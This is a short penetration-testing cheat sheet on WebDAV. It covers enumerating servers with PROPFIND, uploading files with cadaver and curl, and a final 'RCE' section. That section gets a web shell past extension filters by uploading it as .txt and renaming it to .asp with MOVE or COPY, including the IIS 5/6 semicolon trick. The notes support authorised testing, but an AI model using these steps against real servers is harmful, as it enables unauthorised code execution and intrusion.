# WebDAV

## Enumeration

Send a PROPFIND request to the server. We expect the server to answer in one of the following ways:

* `HTTP 207: Multi-Status`: WebDAV is active and the requested path is valid
* `HTTP 403: Forbidden`: Authentication required to perform the operation
* `HTTP 405: Method Not Allowed`: WebDAV is active and the requested folder does not exist. This code is usually returned by Linux machines running Apache.
* `HTTP 501: Not Supported`: WebDAV is not active

```
curl -vX PROPFIND --header 'Depth:0' '<host>/<folder>'
curl -vX PROPFIND --header 'Depth:0' '<host>/<folder>' --user '<user>:<pass>' --basic
```

## File upload

### Cadaver

Access the host.

```
cadaver <host>
```

Cadaver will automatically prompt for credentials when performing restricted operations.

```
ls                        
cd <folder>    
cat <filename>           
put <file>
get <file>
mput <files>   #multiple file upload. Supports wildcards
mget <files>   #multiple file download. Supports wildcards
move <filename> <folder>
copy <filename> <folder>
delete <filename>
```

### Manual

File upload functionality may require valid credentials.

```
curl -T '<file>' '<url>'    #anonymous
curl -T '<file>' '<url>' -u <user>:<pass>
```

### RCE

Bypass extension filter by uploading a shell with a modified extension (such as .txt) and then use the MOVE command to rename it once uploaded to the server.&#x20;

```
curl -X MOVE --header 'Destination:http://<host>/shell.asp' '<host>/shell.txt'
curl -X COPY --header 'Destination:http://<host>/shell.asp' '<host>/shell.txt'
```

There is a vulnerability on IIS 5 and 6 where if a file is renamed to something like `.asp;txt` WebDAV will execute its content despite showing an error message.

```
curl -X MOVE --header 'Destination:http://<host>/shell.asp;txt' '<host>/shell.txt'
curl -X MOVE --header 'Destination:http://<host>/shell.asp%3b.txt' '<host>/shell.txt'
```
